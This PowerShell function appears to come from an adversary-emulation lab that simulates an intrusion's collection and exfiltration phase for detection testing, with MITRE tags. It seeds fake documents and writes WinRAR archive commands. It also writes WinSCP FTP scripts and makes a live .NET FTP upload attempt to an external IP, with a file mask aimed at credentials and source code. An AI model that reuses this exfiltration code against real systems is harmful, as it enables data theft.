# ============================================================================
# BLURRING THE LINES SIM - PHASE 10: COLLECTION & EXFILTRATION
# ============================================================================
# Simulates: (1) WinRAR deployed (winrar-x64-611.exe -> C:\Program Files\WinRAR\
# WinRAR.exe) and used to archive high-value directories with the exact reported
# switches (a -ep1 -scul -r0 -iext -imon1 -- . <dest>); (2) FS64.exe file
# collection against a mounted file-server share, copying .xls/.xlsx/.doc/.docx/
# .pdf into C:\Users\Public\Music and writing __<ip>_F$_Shares.txt; (3) Day-2
# exfiltration over CLEAR-TEXT FTP (WinSCP) to 144.202.61.209, driven by a
# WinSCP.ini with a source-code/web file mask.
# MITRE: T1560.001 Archive via Utility, T1119 Automated Collection,
#        T1074 Data Staged, T1048 Exfiltration Over Alternative Protocol
# ============================================================================

function Simulate-CollectionExfiltration {
    param($SimPaths)

    Write-Host "[+] Phase 10: Collection & Exfiltration - WinRAR + FS64 + WinSCP FTP ..." -ForegroundColor Green

    # --- Seed synthetic victim documents to collect --------------------------
    $docTypes = @("Finance.xlsx", "HR_Records.docx", "Contracts.pdf", "Cyber_Insurance_Policy.pdf", "Passwords.xlsx", "Board_Minutes.doc")
    foreach ($d in $docTypes) {
        Set-Content -Path (Join-Path $SimPaths.VictimFiles $d) -Value "Lab placeholder business document: $d" -Force
    }

    # --- WinRAR deploy + archive with exact reported switches -----------------
    $winrarInstaller = "$($SimPaths.PublicMusic)\winrar-x64-611.exe"
    New-RunnablePayload -Path $winrarInstaller -OverlayStrings @("WinRAR installer 6.11") | Out-Null
    $winrarDir = "$env:ProgramFiles\WinRAR"
    New-Item -Path $winrarDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $winrar = "$winrarDir\WinRAR.exe"
    New-RunnablePayload -Path $winrar -OverlayStrings @("WinRAR archiver") | Out-Null

    # Real archive of the sandbox victim_files (repointed away from any real share).
    $archive = "$($SimPaths.Staging)\CORP_IT.part1.rar"
    try {
        Compress-Archive -Path "$($SimPaths.VictimFiles)\*" -DestinationPath "$($SimPaths.Staging)\CORP_IT.part1.zip" -Force -ErrorAction SilentlyContinue
        if (Test-Path "$($SimPaths.Staging)\CORP_IT.part1.zip") {
            Rename-Item -Path "$($SimPaths.Staging)\CORP_IT.part1.zip" -NewName "CORP_IT.part1.rar" -Force -ErrorAction SilentlyContinue
        }
    } catch {}
    if (-not (Test-Path $archive)) { New-DecoyBinary -Path $archive -SizeBytes 262144 | Out-Null }
    $winrarCmd = "`"$winrar`" a -ep1 -scul -r0 -iext -imon1 -- . F:\Shares\CORP\IT"
    Set-Content -Path "$($SimPaths.Logs)\winrar_archive.log" -Value $winrarCmd -Force
    Write-Host "    WinRAR command: $winrarCmd" -ForegroundColor DarkGray
    Write-SimEvent -EventId 10001 -Message "SIMULATION: WinRAR archived high-value directories ($winrarCmd) (T1560.001)"

    # --- FS64.exe file collection over a mounted share ------------------------
    $fs64 = "$($SimPaths.PublicMusic)\FS64.exe"
    New-RunnablePayload -Path $fs64 -OverlayStrings @("FS64 file collector", "SHA256:$($Global:BlurIOCs.Hashes['fs64.exe'])") | Out-Null
    Set-ArtifactTimestamp -Path $fs64 -Anchor $Global:BlurTimeline.Day2 -JitterMinutes 25
    Invoke-RunPayload -Path $fs64
    # FS64 output listing of collected files
    Set-Content -Path "$($SimPaths.PublicMusic)\__10.10.10.20_F`$_Shares.txt" -Value (
        ($docTypes | ForEach-Object { "F:\Shares\CORP\$_" }) -join "`r`n"
    ) -Force
    # Copy the "collected" docs into the staging folder as FS64 would
    foreach ($d in $docTypes) {
        Copy-Item -Path (Join-Path $SimPaths.VictimFiles $d) -Destination (Join-Path $SimPaths.PublicMusic $d) -Force -ErrorAction SilentlyContinue
    }
    Write-SimEvent -EventId 10002 -Message "SIMULATION: FS64.exe collected .xls/.docx/.pdf from file-server share -> C:\Users\Public\Music (T1119)"

    # --- WinSCP clear-text FTP exfiltration to 144.202.61.209 -----------------
    $winscpIni = "$($SimPaths.PublicMusic)\WinSCP.ini"
    Set-Content -Path $winscpIni -Value @"
[Configuration\Interface]
[Sessions\corp-exfil]
HostName=$($Global:BlurIOCs.ExfilFtpIp)
PortNumber=$($Global:BlurIOCs.ExfilFtpPort)
FSProtocol=5
UserName=ftpupload
; Custom transfer mask targeting web content, credentials and source code:
Mask=*.html; *.php; *.js; *.css; *.cfg; *.ini; *.htaccess; *.sh; *.pl; *.c; *.cpp
"@ -Force
    # WinSCP scripting file the actor would run
    $winscpScript = "$($SimPaths.Tools)\exfil.txt"
    Set-Content -Path $winscpScript -Value @"
open ftp://ftpupload@$($Global:BlurIOCs.ExfilFtpIp)/
put "$($SimPaths.Staging)\CORP_IT.part1.rar"
put "$($SimPaths.VictimFiles)\Finance.xlsx"
close
exit
"@ -Force
    Write-Host "    Exfil over clear-text FTP to $($Global:BlurIOCs.ExfilFtpIp):$($Global:BlurIOCs.ExfilFtpPort) (offline, expected) ..." -ForegroundColor DarkGray
    Invoke-SafeNetworkAttempt -Target $Global:BlurIOCs.ExfilFtpIp -Port $Global:BlurIOCs.ExfilFtpPort

    # Generate a real clear-text FTP control-channel attempt for PCAP fidelity.
    try {
        $ftp = [System.Net.FtpWebRequest]::Create("ftp://$($Global:BlurIOCs.ExfilFtpIp)/CORP_IT.part1.rar")
        $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
        $ftp.Credentials = New-Object System.Net.NetworkCredential("ftpupload", "P@ssw0rd-lab")
        $ftp.Timeout = 3000
        $ftp.UsePassive = $true
        $ftp.UseBinary = $true
        $rs = $ftp.GetRequestStream()   # will fail closed against the offline host
        $rs.Close()
    } catch {}
    Write-SimEvent -EventId 10003 -Message "SIMULATION: Day-2 exfiltration over clear-text FTP (WinSCP) to $($Global:BlurIOCs.ExfilFtpIp) (T1048)"

    Write-Host "  [OK] Collection & Exfiltration artifacts created (WinRAR, FS64, WinSCP FTP)" -ForegroundColor Yellow
}
